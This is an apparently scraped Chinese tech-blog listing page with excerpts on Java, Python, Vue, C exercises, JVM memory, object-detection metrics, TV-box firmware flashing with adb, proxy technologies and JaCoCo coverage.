部分源码如下： // ThreadLocal类中的get()方法: // 代码逻辑： // 1、通过当前线程对象，获取线程对象中的成员变量threadLocals 即threadLocalMap。 // 2、拿到threadLocalMap后，根据当前threadLocal对象作为key，获取value值。 // 3、如果threadLocalMap为空，进行初始化 public T get() { Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) { ThreadLocalMap.Entry e = map.getEntry(this); if (e != null) { @SuppressWarnings("unchecked") T result = (T)e.value; return result; } } return setInitialValue(); } // ThreadLocal类中的setInitialValue()方法: 设置ThreadLocalMap的初始化值。 private T setInitialValue() { T value = initialValue(); Thread t = Thread.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d25483345988ea937fb4d9337683dcb2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8f84a8ddd1f1ff9dc0748b2b6691c174/" rel="bookmark">
			基于SSM的图书管理系统的设计与实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		博主介绍：✌在职Java研发工程师、专注于程序设计、源码分享、技术交流、专注于Java技术领域和毕业设计✌
温馨提示：文末有 CSDN 平台官方提供的老师 Wechat / QQ 名片 :)
项目名称 基于SSM的图书管理系统的设计与实现
演示视频 基于SSM的图书管理系统的设计与实现_哔哩哔哩_bilibili
系统介绍 摘要 随着互联网技术的迅速发展和数字化时代的到来，图书管理系统在各类图书馆、学术机构和企事业单位中发挥着越来越重要的作用。然而，传统的图书管理系统在功能上存在局限性，且难以满足现代化信息管理的需求。因此，探讨基于SSM框架的图书管理系统的设计与实现具有重要的现实意义，旨在提高图书管理效率和用户体验。
图书管理系统采用Java技术开发，后台基于SSM框架搭建，数据库选用MySQL。系统实现了以下功能：个人中心、用户管理、图书分类管理、图书信息管理、借书信息管理、还书信息管理、图书评分管理、留言板以及系统管理等。本系统具备优良的兼容性和适应性，为用户提供丰富的图书信息，同时构建了一个高效的平台，从而增强了系统的核心竞争力。
关键字 图书管理 SSM框架 信息管理 借书
3.2 系统功能需求 经过前面的功能分析，我们可以将图书管理系统的功能划分为管理员和用户两个部分。系统的主要功能包括：个人中心、用户管理、图书分类管理、图书信息管理、借书信息管理、还书信息管理、图书评分管理、留言板和系统管理等。本系统主要针对已注册登录的用户，以方便他们查看满意的图书信息。
图书管理系统主要分为管理员角色以及用户角色两种角色权限，系统通过角色进行功能划分，管理员角色主要包括了：借阅管理、图书管理系统、读者管理、类型管理、公告管理、管理员管理以及统计分析等功能模块。用户功能及权限：用户在完成注册登录后，可进入系统进行相应的操作和管理。管理员功能及权限：管理员主要负责用户信息的添加和管理、图书详细信息的添加和管理、文档信息的添加和管理以及网站信息的管理等。这些功能都是管理员的职责范围。系统用例如图3-1所示。
图3-1 系统用例图
3.2.1用户模块 公告管理 这个用户公告管理模块主要用于管理和查询公告信息。页面布局采用了HTML、CSS和JavaScript构建的网页界面，包含一个搜索栏、一个数据展示表格和一个操作按钮。搜索栏用于输入公告主题进行搜索，数据展示表格用于展示查询到的公告信息，操作按钮则提供查询详情的功能。
在这个模块中，使用了Layui框架的表格组件来展示公告信息。表格列包括公告主题、公告内容、发布者和发布时间等。用户可以在搜索栏输入公告主题关键字进行筛选查询。点击“搜索”按钮后，表格会根据输入的公告主题筛选并显示相关结果。
借阅管理 用户借阅管理功能主要用于展示和跟踪图书的借阅与归还情况。在这个功能中，采用了一个时间线的形式来呈现用户的借书和还书记录。每条记录会显示借阅时间、读者姓名、书名以及归还时间（如果已经归还的话）。
使用了Layui框架的时间线组件，每一条借阅记录都显示在时间线上。借阅时间格式为"yyyy年MM月dd日HH点mm分ss秒"。对于已经归还的图书，归还时间会显示在相应的记录中，并标注为“归还”。
在展示借阅记录时，读者姓名会以红色字体显示，书名则用深红色字体。通过这种时间线形式，用户可以直观地查看图书借阅和归还情况，方便对借阅信息进行管理。
系统登录 用户登录功能主要用于验证用户身份并实现登录。在这个功能中，首先获取用户输入的用户名、密码、验证码以及用户类型。登录过程分为两个验证步骤：首先验证输入的验证码是否正确，然后验证用户名和密码是否匹配。
在第一步验证中，比较用户输入的验证码和服务器端存储在session中的验证码是否一致。如果不一致，将在页面上显示“验证码不正确”的提示信息，并返回登录页面。如果验证码正确，则进行第二步验证。
在第二步验证中，根据用户类型（管理员或读者）查询相应的用户数据。若用户名和密码匹配，登录成功并将用户信息存入session，同时将用户类型也存入session以便后续使用。登录成功后，页面跳转到首页。若用户名和密码不匹配，页面上显示“用户名或密码错误”的提示信息，并返回登录页面。
整个用户登录功能实现了简单的身份验证，保证只有合法用户可以登录系统。
3.2.2 管理员模块 图书管理 管理员图书管理功能主要用于对图书信息的管理，包括查看、编辑、删除和添加等操作。在图书管理界面，管理员可以看到如下信息：图书编号、图书名称、图书类型、作者、价格和语言等。此外，还可以看到每个图书条目的操作按钮，用于执行相应的管理操作。
管理员可以通过搜索功能查找特定的图书，例如根据图书编号、书名或图书分类等条件进行筛选。在查询结果中，管理员可以对图书信息进行编辑，如修改图书名称、图书类型、作者、价格和语言等属性。同时，管理员还可以执行删除操作，将不再需要的图书信息从系统中移除。
读者管理 读者管理系统是一个方便图书馆工作人员管理读者信息的工具，提供了对读者信息的实时查看、新增、修改和删除功能。在这个系统中，每个读者都会有一个独一无二的读者卡号。系统包含了读者的用户名、真实姓名、性别、电话、办卡时间、邮箱等个人信息。通过这些详细信息，图书馆工作人员可以更方便地为读者提供服务，了解读者的借阅情况，以及在需要时进行联系。此外，读者管理系统还支持按页浏览，每页显示指定数量的读者信息，方便工作人员快速查找和管理。例如，在给出的信息中，我们可以看到共有3位读者，每页显示15条信息。
读者管理 读者管理系统是一个方便图书馆工作人员管理读者信息的工具，提供了对读者信息的实时查看、新增、修改和删除功能。在这个系统中，每个读者都会有一个独一无二的读者卡号。系统包含了读者的用户名、真实姓名、性别、电话、办卡时间、邮箱等个人信息。通过这些详细信息，图书馆工作人员可以更方便地为读者提供服务，了解读者的借阅情况，以及在需要时进行联系。此外，读者管理系统还支持按页浏览，每页显示指定数量的读者信息，方便工作人员快速查找和管理。例如，在给出的信息中，我们可以看到共有3位读者，每页显示15条信息。
类型管理 类型管理功能使用户能够创建、编辑、查找和删除不同类型的分类。在一个简洁的界面上，用户可以输入类型名称进行搜索，找到所需类型。搜索结果将以表格形式显示，其中包含类型名称和备注。用户可以通过点击“添加”按钮来创建新类型，并通过点击表格中的“编辑”和“删除”按钮来修改或移除现有类型。此功能适用于各种场景，例如图书、课程或项目分类。类型管理功能简化了组织和分类信息的过程，帮助用户更轻松地管理和查找数据。
类型管理 类型管理功能使用户能够创建、编辑、查找和删除不同类型的分类。在一个简洁的界面上，用户可以输入类型名称进行搜索，找到所需类型。搜索结果将以表格形式显示，其中包含类型名称和备注。用户可以通过点击“添加”按钮来创建新类型，并通过点击表格中的“编辑”和“删除”按钮来修改或移除现有类型。此功能适用于各种场景，例如图书、课程或项目分类。类型管理功能简化了组织和分类信息的过程，帮助用户更轻松地管理和查找数据。
统计分析 统计分析用于显示一个饼图，展示各种图书分类的数量统计分析。首先，通过引入Spring和JSTL相关的标签库，用于处理表单和迭代数据。接下来，定义了HTML文档结构，包括标题“统计数据”，在body部分创建一个包含图表的div容器。接着，引入了layui框架和echarts图表库以及相关的配置文件。实现了一个简单的图书分类数量统计分析的功能，通过展示一个饼图来可视化各个分类的占比情况。
4.1 系统整体设计
在系统需求明确、系统分析和数据库设计完成后，我们可以根据网站特点确定网站的发展模式，进而实现代码编写。经过对网站的分析，这个网站属于一个较小的项目，所完成的功能相对简单，主要为数据的基本操作。因此，我们决定采用B/S（浏览器/服务器）开发模式。该模型的基本过程是：用户通过浏览器访问网站或向服务器发送请求，服务器接收请求后调用数据访问逻辑进行处理，再将处理结果返回给用户的浏览器。图书管理系统的整个设计结构如图4-1所示。
图4-1系统功能结构图
系统功能结构图是系统设计阶段的一个基础要素，它决定了系统的整体架构和模式，是整个系统的基础和依据。用中文重新描述一遍：系统功能结构图是在系统设计阶段非常重要的一个环节，它仅仅是这个阶段的基础部分。整个系统的架构将决定系统的整体模式，它是构建系统的根本依据。
环境需要 1.运行环境：最好是java jdk 1.8，我们在这个平台上运行的。其他版本理论上也可以。
2.IDE环境：IDEA，Eclipse,Myeclipse都可以。推荐IDEA;
3.tomcat环境：Tomcat 7.x,8.x,9.x版本均可
4.硬件环境：windows 7/8/10 1G内存以上；或者 Mac OS； 5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8f84a8ddd1f1ff9dc0748b2b6691c174/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8dc541e3a83fc0e28cedb0283912c3e7/" rel="bookmark">
			python将一个list 赋值给一个新的list的几种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Python中，您可以使用以下方法将一个列表赋值给一个新的列表：
使用=操作符（浅拷贝）： list1 = [1, 2, 3] list2 = list1 注意：这种方法会使得list2和list1指向同一个内存地址，因此对list2的修改也会影响到list1。
使用copy()方法（浅拷贝）： list1 = [1, 2, 3] list2 = list1.copy() 这种方法会创建一个新的列表list2，包含list1中的所有元素。对list2的修改不会影响到list1。
使用list()函数（浅拷贝）： list1 = [1, 2, 3] list2 = list(list1) 这种方法与copy()方法类似，会创建一个新的列表list2，包含list1中的所有元素。对list2的修改不会影响到list1。
使用切片操作（浅拷贝）： list1 = [1, 2, 3] list2 = list1[:] 这种方法也会创建一个新的列表list2，包含list1中的所有元素。对list2的修改不会影响到list1。
使用copy.deepcopy()方法（深拷贝）： import copy list1 = [1, 2, [3, 4]] list2 = copy.deepcopy(list1) 这种方法会创建一个新的列表list2，包含list1中的所有元素及其嵌套的子元素。对list2的修改不会影响到list1。这种方法适用于列表中包含可变对象（如列表、字典等）的情况。
以上方法的区别：
方法2、3和4在功能上都是实现浅拷贝，它们的主要区别在于语法和实现方式。以下是它们的区别：
方法2（使用copy()方法）： list1 = [1, 2, 3] list2 = list1.copy() 这种方法是通过调用列表对象的copy()方法来实现浅拷贝。这是一种面向对象的方法，直接作用于列表对象。
方法3（使用list()函数）： list1 = [1, 2, 3] list2 = list(list1) 这种方法是通过调用Python内置的list()函数来实现浅拷贝。这是一种函数式方法，将列表对象作为参数传递给list()函数。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8dc541e3a83fc0e28cedb0283912c3e7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0d3acb0602d117143583f72966bb8a0/" rel="bookmark">
			论文笔记Monocular Depth Estimation through Virtual-world Supervision and Real-world SfM Self-Supervision
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Problem Formulation MDE on CNN : Ψ ( θ ; x ) → d \Psi(\theta;x) \rightarrow d Ψ(θ;x)→d θ ∗ = min ⁡ θ L ( θ ; X r , X s . Y s ) \theta^* = \min_{\theta} \mathcal{L}(\theta;X^r,X^s.Y^s) θ∗=minθ​L(θ;Xr,Xs.Ys). Contributions A CNN architecture training on virtual-world supervision and real-world SfM self supervision.Reduce domain discrepancied between supervised (virtual world) and semi-supervised (real world) data at the space of the extracted features (backbone bottleneck) by Gradient reveral layer(GRL).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d0d3acb0602d117143583f72966bb8a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20b5b357fe4fec5b8d15bcb6f247f480/" rel="bookmark">
			目标检测Object Detection下的P-R曲线，AP，mAP，AUC，ROC曲线详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一,P-R曲线二,AP( 等价于 A U C P R AUC_{PR} AUCPR​)三,mAP四,COCO的AP和mAP五,代码解析六,ROC曲线七, A U C R O C AUC_{ROC} AUCROC​八,题外话 一,P-R曲线 上篇文章我们详细说了一下Detection中的Recall和Precision的计算，P-R曲线就是Precision和Recall画出的曲线。横轴是Recall，纵轴是Precision，那是什么的变化产生了这么多组PR值的呢？
答案：置信度。
举个栗子，已知在IOU为0.5的时候，一个检测网络检测猫狗鸡三种目标，输出如下结果：
以检测猫为例，画出P-R曲线？
首先，我们要计算出每个置信度下的TP和FP，以及TP+FN
计算过程，当我们只看第一个置信度最高的检测结果的时候，结果如下，计算出一组P，R
当我们把置信度拉到0.95，只看前两个计算结果的时候，计算出一组P，R
以此类推，我们计算出在所有置信度下的所有P，R值
然后将Recall作为横轴，Precision作为纵轴，画图
这样,我们就画出了在IOU0.5下模型检测猫的P-R曲线
二,AP( 等价于 A U C P R AUC_{PR} AUCPR​) 有了P-R曲线,要计算AP(Average Precision)直接求P-R曲线下的面积就行了,通常来说就是一个积分:
A P = ∫ 0 1 p ( r ) d r AP=\int_0^1 p(r) \mathrm{d}r AP=∫01​p(r)dr
当然，不可导的地方我们可以分段积分。
但是，一般我们不直接去这么算,会简化一下，求个近似：
p i n t e r p ( r ) = max ⁡ r ~ ≥ r p ( r ~ ) p_{interp}(r)=\max_{\tilde{r}\geq r} p(\tilde{r}) pinterp​(r)=r~≥rmax​p(r~)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/20b5b357fe4fec5b8d15bcb6f247f480/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/adfeec5be63f7f9755a7f223812ea28b/" rel="bookmark">
			vue中使用v-for实现两次嵌套循环，判断某子元素是否显示，进行复杂表单校验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、需求场景： 有以下一个使用场景，名称111、名称222、名称333，是放在一个大数组里的，然后通过第一层for循环显示出来的。名称333数组里又包含自己的子数组，子数组再通过第二次for循环展示出来。当我们选择发放方式的时候，符合选择条件的只显示自己对应那一行的首发比例。最后对子数组里的每一项进行表单校验。
关于数组结构，我们前端这边可以自定义写好。
const form = reactive({ title: '', templateList: [{ key: 'region', label: '名称111', list: [{ settlement_type: '1', limit_days: '0', rate: '', settlement_way: '' }] }, { key: 'partner', label: '名称222', list: [{ settlement_type: '2', limit_days: '0', rate: '', settlement_way: '' }] }, { key: 'user', label: '名称333', list: [ { settlement_type: '3', limit_days: '30', rate: '', settlement_way: '' }, { settlement_type: '3', limit_days: '60', rate: '', settlement_way: '' }, { settlement_type: '3', limit_days: '180', rate: '', settlement_way: '' }, { settlement_type: '3', limit_days: '90', rate: '', settlement_way: '' }, ] }] }) 二、解决方法： 可以考虑使用 v-for 进行双层嵌套循环，其中有几个需要注意的点：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/adfeec5be63f7f9755a7f223812ea28b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b298edc5a6a7953246466a0222e8f625/" rel="bookmark">
			中兴B860AV1.1-T2刷机教程 适用于歪芯片
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		找到了一个中兴电视盒子，正好家里电视还能用，就想刷个机试试
中兴的B860AV1.1-T2为例，中兴的型号有很多，一定不要弄错了。B860AV1.1-T2一共分两个版本，一个处理器是正的，一个处理器是歪斜的，此教程只适用于CPU歪斜的。反正我的是歪的，成功了。
教程不是我原创的，是为了以后找不到教程了，做个备份用。
中兴B860AV1.1-T2纯净精简包
ROM介绍：
1.此固件只适用中兴B860AV1.1-T2纯净精简包，当贝桌面加当贝市场，纯净版。
2.刷机后将导致原IPTV失效，介意勿刷！
3.刷机后可支持自由安装第三方应用；
4.注意：四川地区等高安CA版本请勿下载，不可刷入！
1、准备工具：
1.1刷机包下载（免费奉上）：链 https://share.weiyun.com/5mct1Tu 密 7mw3g6
下载后解压，得到主要2个文件：ota.zip和recovery.img，
电脑插上一个U盘（请格式为FAT32的），将recovery.img复制U盘根目录，
然后再新建一个文件夹，命名ZTESTBUSB，并将ota.zip复制到ZTESTBUSB文件夹里，
复制完毕后，将U盘插到机顶盒的USB接口上。
1.2 ADB组件下载：http://cdn.tvapk.com/zndsjc/adb.zip
将下载好的ADB组件解压到C盘的根目录
1.3 最新ADB密码计算器下载：http://cdn.tvapk.com/zndsrom/app/zikaikeji.apk
找一台安卓手机，将最新的ADB密码计算器安装上（如果没有安卓手机或平板，也可以电脑安装一个电脑安卓模拟器）
2、进入中兴盒子的设置，一般密码为：6321或运营商的号码（10086、10000、10010），连接wifi（或者网线）（机顶盒和电脑处于同个网段），接着选择运维调试—打开ADB调试，然后运行ADB密码计算器，将对应的MAC地址与随机数填入，这里需要注意，如果随机数是不带C的就选第一个“计算20170106”，如果随机数是带C的就选择“计算20180207”，然后将计算的密码填入，成功激活ADB！
3、回到电脑操作，按下键盘快捷键“WIN+R”，输入“cmd”确定，进入命令终端
复制加粗的命令即可：
C:\Users\Jack&gt;cd c:/adb
c:\adb&gt;adb connect 192.168.1.110 （不要以我的为准，盒子设置里可以找到你的盒子IP地址，输入自己盒子的IP）
* daemon not running. starting it now on port 5037 *
* daemon started successfully
*connected to 192.168.0.101:5555
c:\adb&gt;adb shell
255|shell@square:/ $ su
su
root@square:/ # mount -o remount -o rw /system
mount -o remount -o rw /system
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b298edc5a6a7953246466a0222e8f625/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/76418308a928952ad83ea9aa8762c1cf/" rel="bookmark">
			【VUE】监听滚动条位置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 mounted () { window.addEventListener('scroll',this.handleScroll,true) }， methods:{ handleScroll (e) { let scrollY = e.target.scrollTop; consolo.log(scrollY); } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb06e80397a0969972b3b53d7dc5ebd8/" rel="bookmark">
			C语言程序设计之求两个整数的较大值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include&lt;stdio.h&gt; int MAX(int x,int y) { if (x &gt; y) return x; else { return y; } } int main() { int a = 0; int b = 0; scanf("%d %d", &amp;a, &amp;b); //求两个整数的较大值 int r=MAX(a, b); printf("%d", r); return 0; } 首先先定义一个MAX函数，这里用if…else…语句来写一个简单的大小比较的函数
然后定义main()函数来调用MAX函数对输入的两个数进行比较即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b2e58e1a72076856952e12b70aea9561/" rel="bookmark">
			c语言程序设计小练习之按要求计算表达式（牛客招聘企业真题）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 请计算表达式“(-8 + 22) xa - 10 + c ➗2”其中a=40,c=212,结果为一个整数。
#include&lt;stdio.h&gt; int main() { int a = 40; int c = 212; int r = (-8 + 22) * a - 10 + c / 2; printf("%d\n", r); } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ccef8229b0422523c128830aa0548f1/" rel="bookmark">
			python3如何降级到python2？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 无法将Python 3降级到Python 2。Python 2和Python 3是不兼容的两个主要版本，它们有许多语法和库的差异。此外，Python 2已于2020年停止维护，不再接收更新和安全补丁。
如果已经安装了Python 3，并且想要在同一台机器上同时使用Python 2和Python 3，按照以下步骤进行操作：
1. 安装Python2的最后一个版本python2.7.18 下载跳转
2. 安装完Python 2后，将拥有两个独立的Python解释器：Python 3的默认解释器（通常是python3）和Python 2的解释器（通常是python）。 （强烈建议安装时一切默认安装，不要改地址）
3. 命令行中运行Python 2代码 python2 your_script.py 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b6c9009567fd61704f1ec7dd20f1f5f/" rel="bookmark">
			已解决 Error: ENOENT: no such file or directory, mkdir ‘E:\‘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题 在设置Node.js 全局模块所在的路径的时候，因为路径错误，导致设置失败
比如说你的电脑只有C盘，然后你在执行了以下命令:
npm set config prefix "E:/.../node.js/node_global" 执行该命令不会提示错误，但是如果你想继续执行其他问题就会提示你找不到路径，有以下提示：
Error: ENOENT: no such file or directory, mkdir ‘E:\‘ 这个时候你想重新设置执行npm set等命令也会发现设置不了，但不要慌张，不要尝试去删除node.js重新安装，就目前来说，我尝试过多次删除重装，但都是没有用的，你重装重新设置还会出现以上提示。
解放方法 最简单的方法就是找到你当前用户的主目录下（一般都是C:/用户/当前用户名） 的.npmrc文件，直接删除他，然后你在重新设置就可以了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26606c5f73348a19c10f63e11800b35c/" rel="bookmark">
			代理IP、IP代理、socks5技术详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着互联网的普及，网络安全和隐私保护越来越受到人们的关注。在网络世界中，代理 IP、IP 代理和 Socks5 技术等网络代理技术成为了人们实现匿名上网、保护隐私的重要手段。本文将对这三种技术进行详解，帮助大家更好地了解这些技术。
一、代理 IP 技术
代理 IP 技术是一种网络代理技术，它通过提供一个假的 IP 地址来代替真实的 IP 地址，从而帮助用户隐藏真实的 IP 地址，实现匿名上网。在使用代理 IP 技术时，用户的网络请求会先发送到代理服务器，代理服务器会将请求转发到目标网站，然后将响应返回给用户。这样，目标网站只能看到代理服务器的 IP 地址，而无法看到用户的真实 IP 地址。
代理 IP 技术主要有以下优点：
隐藏真实 IP 地址，实现匿名上网；
可以访问被限制的网站或资源；
可以绕过网络封锁和审查；
提高网络安全性。
然而，代理 IP 技术也存在一定的缺点，如连接速度较慢、稳定性较差等。同时，代理 IP 技术并不适合所有场景，例如需要使用代理 IP 技术进行远程桌面连接时，可能会导致连接失败。
二、IP 代理技术
IP 代理技术与代理 IP 技术类似，也是一种网络代理技术，它通过提供一个假的 IP 地址来代替真实的 IP 地址，从而帮助用户隐藏真实的 IP 地址，实现匿名上网。与代理 IP 技术类似，IP 代理技术也需要用户将网络请求发送到代理服务器，代理服务器再将请求转发到目标网站，然后将响应返回给用户。
IP 代理技术主要有以下优点：
隐藏真实 IP 地址，实现匿名上网；
可以访问被限制的网站或资源；
可以绕过网络封锁和审查；
提高网络安全性。
与代理 IP 技术相比，IP 代理技术的优点在于连接速度较快、稳定性较好。然而，同样存在一定的缺点，如代理服务器的安全性、稳定性等方面的风险。
三、Socks5 技术
Socks5 技术是一种网络代理技术，它可以在应用程序之间提供安全的网络连接。Socks5 技术工作在会话层，可以代理任何类型的网络请求，包括 HTTP、FTP、SMTP 等。使用 Socks5 技术时，用户的网络请求会先发送到 Socks5 服务器，Socks5 服务器会将请求转发到目标网站，然后将响应返回给用户。Socks5 技术可以提供更高的安全性和隐私保护，因为它可以对网络请求进行加密和身份验证，从而防止网络攻击和数据泄露。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/26606c5f73348a19c10f63e11800b35c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/827c4a3503dcd4f0d9ae7892eb737599/" rel="bookmark">
			jvm专讲之对象创建和内存分配机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java对象创建和内存分配机制详解 一. 对象创建的过程 ​ 对象的主要创建流程如下:
​ 1、类加载检查 ​ 虚拟机遇到一条new指令时，首先将去检查这个指令的参数是否能在常量池中定位到一个类的符号引用，并且检查这个符号引用代表的类是否已被加载、解析和初始化过。如果没有，那必须先执行相应的类加载过程。
​ new指令对应到语言层面上讲是，new关键词、对象克隆、对象序列化等。
2、分配内存 ​ 在类加载检查通过后，接下来虚拟机将为新生对象分配内存。对象所需内存的大小在类加载完成后便可完全确定，为对象分配空间的任务等同于把一块确定大小的内存从Java堆中划分出来。
​ 在分配内存的过程中需要注意两个问题:
​ 1.如何分配内存
​ 2.并发情况下，如果保证分配内存的安全性(在并发情况下， 可能出现正在给对象A分配内存，指针还没来得及修改，对象B又同时使用了相同的指针来分配内存的情况。)
​ 分配内存的方法:
“指针碰撞”(Jvm默认方式):如果Java堆中内存是绝对规整的，所有用过的内存都放在一边，空闲的内存放在另一边，中间放着一个指针作为分界点的指示器，那所分配内存就仅仅是把那个指针向空闲空间那边挪动一段与对象大小相等的距离。
“空闲列表”:如果Java堆中的内存并不是规整的，已使用的内存和空闲的内存相互交错，那就没有办法简单地进行指针碰撞了，虚拟机就必须维护一个列表，记 录上哪些内存块是可用的，在分配的时候从列表中找到一块足够大的空间划分给对象实例， 并更新列表上的记录
当然取决于用哪种分配方式也和使用的垃圾回收器相关。
​ 解决并发问题的方法:
CAS:
虚拟机采用CAS分配失败重试的方式保证更新操作的原子性来对分配内存空间的动作进行同步处理,两个线程同时对同一片空间分配,同一时候只有一个线程可以成功，其他线程会从其他的空间进行重试操作
本地线程分配缓存(TLAB)
把内存分配的动作按照线程划分在不同的空间之中进行，即每个线程在Java堆中预先分配一小块内存。通过-XX:+/-UseTLAB参数来设定虚拟机是否使用TLAB(JVM会默认开启-XX:+UseTLAB),-XX:TLABSize指定TLAB大小。
3、初始化零值 ​ 内存分配完成后，虚拟机需要将分配到的内存空间都初始化为零值（不包括对象头）， 如果使用TLAB，这一工作过程也可以提前至TLAB分配时进行。这一步操作保证了对象的实例字段在Java代码中可以不赋初始值就直接使用，程序能访问到这些字段的数据类型所对应的零值。
4、设置对象头 ​ 初始化零值之后，虚拟机要对对象进行必要的设置，例如这个对象是哪个类的实例、如何才能找到类的元数据信息、对象的哈希码、对象的GC分代年龄等信息。这些信息存放在对象的对象头Object Header之中。
​ 在HotSpot虚拟机中，对象在内存中存储的布局可以分为3块区域：对象头（Header）、 实例数据（Instance Data）和对齐填充（Padding）。 HotSpot虚拟机的对象头包括两部分信息，第一部分用于存储对象自身的运行时数据(mark word)， 如哈希码（HashCode）、GC分代年龄、锁状态标志、线程持有的锁、偏向线程ID、偏向时间戳等。对象头的另外一部分是类型指针，即对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是哪个类的实例，区别于Class实例,Class实例是面向程序员去获取类的信息。
​ 32位的对象头如下图:
​ 64位的对象头如下图:
5、执行init方法 ​ 执行init方法，即对象按照程序员的意愿进行初始化。对应到语言层面上讲，就是为属性赋值（注意，这与上面的赋零值不同，这是由程序员赋的值），和执行构造方法。
二.对象结构 1、查看对象结构 ​ 我们可以通过在项目中添加以下依赖查看对象结构信息:
&lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/org.openjdk.jol/jol-core --&gt; &lt;dependency&gt; &lt;groupId&gt;org.openjdk.jol&lt;/groupId&gt; &lt;artifactId&gt;jol-core&lt;/artifactId&gt; &lt;version&gt;0.9&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; ​ 编写测试类:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/827c4a3503dcd4f0d9ae7892eb737599/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8c6cfaa81017a530205f438b11c1008/" rel="bookmark">
			Java代码覆盖率工具Jacoco上手指引
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JaCoCo是面向Java的开源代码覆盖率工具，JaCoCo以Java代理模式运行，它负责在运行测试时检测字节码。 JaCoCo会深入研究每个指令，并显示每个测试过程中要执行的行。 为了收集覆盖率数据，JaCoCo使用ASM即时进行代码检测，并在此过程中从JVM Tool Interface接收事件，最终生成代码覆盖率报告。
jacoco运行有离线（offline）、在线（on the fly）模式之说，所谓在线模式就是在应用启动时加入jacoco agent进行插桩，在开发、测试人员使用应用期间实时地进行代码覆盖率分析。相信很多的java项目开发人员并不会去写单元测试代码的，因此覆盖率统计就要把手工测试或接口测试覆盖的情况作为重要依据，显然在线模式更符合实际需求，本文以在线模式为例进行演示。
Jacoco安装 从官网
https://www.jacoco.org/jacoco/下载最新版本并解压到指定目录
主要用到如下二个jar包：
在线模式jacoco覆盖率统计包含三个步骤：
启动应用增加jacoco agent进行插桩，该步骤会启动TCP Server。从TCP Server dump生成代码覆盖率文件，生成的文件格式为.exec格式的二级制文件。解析.exec格式文件生成html格式代码覆盖率报告。 准备Java示例代码 事先需要创建java示例代码，本文不聚焦java代码相关的内容，大家可以使用自己的java项目代码进行验证，或者直接clone本文提供的spring boot示例代码仓库
https://gitee.com/pepperpapa/jacoco_demo。
注意：在线模式使用的代码一定要是类似web应用这种永远不会退出的程序为例，因为收集jacoco agent要启用tcp server，如果程序执行完就退出了tpc server也关闭了。 示例代码就是提供两个简单的URL访问，访问截图如下：
http://127.0.0.1:8080/hello
http://127.0.0.1:8080/byebye
执行构建命令mvn clean package后，会在target目录生成可运行的jar包
启动jacoco agent进行插桩 打开cmd，cd到示例代码的target目录，执行如下命令：
java -javaagent:C:\工具\jacoco-0.8.6\lib\jacocoagent.jar=includes=*,output=tcpserver,port=6300,address=localhost,append=true -jar demo-0.0.1-SNAPSHOT.jar 关键参数说明：
